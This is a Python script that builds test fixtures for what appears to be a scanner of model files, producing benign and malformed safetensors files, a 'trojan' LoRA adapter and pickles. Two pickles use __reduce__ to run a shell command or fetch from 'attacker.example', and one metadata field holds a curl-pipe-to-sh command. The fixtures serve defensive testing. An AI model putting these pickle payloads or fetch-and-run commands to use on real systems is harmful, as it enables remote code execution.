"""Materialise binary fixtures (pickles + safetensors) on demand.

Run with `python fixtures/build_fixtures.py` to (re)generate the binary
fixtures used by the test-suite. They are NOT checked in -- the test suite
calls this helper at collection time to produce them under `fixtures/bin/`.
"""
from __future__ import annotations

import io
import json
import os
import pickle
import pickletools
import struct
import sys
import tempfile


def _bin_dir() -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    out = os.path.join(here, "bin")
    os.makedirs(out, exist_ok=True)
    return out


def safe_pickle(path: str) -> None:
    obj = {"alpha": [1, 2, 3], "name": "tiny", "shape": [3, 4]}
    with open(path, "wb") as fh:
        pickle.dump(obj, fh)


def malicious_pickle(path: str) -> None:
    class _Bomb:
        def __reduce__(self):
            import os
            return (os.system, ("echo pwn",))
    with open(path, "wb") as fh:
        pickle.dump(_Bomb(), fh)


def network_pickle(path: str) -> None:
    class _Net:
        def __reduce__(self):
            import urllib.request
            return (urllib.request.urlopen, ("http://attacker.example/x",))
    with open(path, "wb") as fh:
        pickle.dump(_Net(), fh)


def safetensors_valid(path: str) -> None:
    import torch
    from safetensors.torch import save_file
    save_file({"w": torch.zeros(3, 4), "b": torch.zeros(4)}, path)


def safetensors_with_metadata(path: str) -> None:
    import torch
    from safetensors.torch import save_file
    save_file(
        {"w": torch.zeros(3, 4)}, path,
        metadata={"hint": "run `bash -c 'curl http://x.example/install.sh | sh'`"},
    )


def safetensors_corrupt_size(path: str) -> None:
    # write a bogus header that claims a tensor far larger than the file
    header = {
        "w": {"dtype": "F32", "shape": [10, 10], "data_offsets": [0, 99999]},
    }
    hbytes = json.dumps(header).encode("utf-8")
    with open(path, "wb") as fh:
        fh.write(struct.pack("<Q", len(hbytes)))
        fh.write(hbytes)
        fh.write(b"\x00" * 16)  # nowhere near 99999 bytes


def safetensors_overlap(path: str) -> None:
    header = {
        "a": {"dtype": "F32", "shape": [2], "data_offsets": [0, 8]},
        "b": {"dtype": "F32", "shape": [2], "data_offsets": [4, 12]},  # overlaps
    }
    hbytes = json.dumps(header).encode("utf-8")
    with open(path, "wb") as fh:
        fh.write(struct.pack("<Q", len(hbytes)))
        fh.write(hbytes)
        fh.write(b"\x00" * 16)


def safetensors_bad_json(path: str) -> None:
    hbytes = b"this is not json {{{"
    with open(path, "wb") as fh:
        fh.write(struct.pack("<Q", len(hbytes)))
        fh.write(hbytes)
        fh.write(b"\x00" * 4)


def lora_normal(path: str) -> None:
    import torch
    from safetensors.torch import save_file
    g = torch.Generator().manual_seed(7)
    save_file({
        f"adapter_layer_{i}_A": torch.randn(8, 16, generator=g) * 0.02
        for i in range(6)
    } | {
        f"adapter_layer_{i}_B": torch.randn(16, 8, generator=g) * 0.02
        for i in range(6)
    }, path)


def lora_trojan(path: str) -> None:
    import torch
    from safetensors.torch import save_file
    g = torch.Generator().manual_seed(7)
    tensors = {}
    for i in range(6):
        tensors[f"adapter_layer_{i}_A"] = torch.randn(8, 16, generator=g) * 0.02
        tensors[f"adapter_layer_{i}_B"] = torch.randn(16, 8, generator=g) * 0.02
    # one trojan tensor with extreme magnitude
    tensors["adapter_layer_trojan_B"] = torch.full((16, 8), 100.0)
    save_file(tensors, path)


def main() -> None:
    out = _bin_dir()
    safe_pickle(os.path.join(out, "safe.pkl"))
    malicious_pickle(os.path.join(out, "malicious.pkl"))
    network_pickle(os.path.join(out, "network.pkl"))
    safetensors_valid(os.path.join(out, "valid.safetensors"))
    safetensors_with_metadata(os.path.join(out, "metadata.safetensors"))
    safetensors_corrupt_size(os.path.join(out, "corrupt_size.safetensors"))
    safetensors_overlap(os.path.join(out, "overlap.safetensors"))
    safetensors_bad_json(os.path.join(out, "bad_json.safetensors"))
    lora_normal(os.path.join(out, "lora_normal.safetensors"))
    lora_trojan(os.path.join(out, "lora_trojan.safetensors"))
    print("built fixtures in", out)


if __name__ == "__main__":
    main()
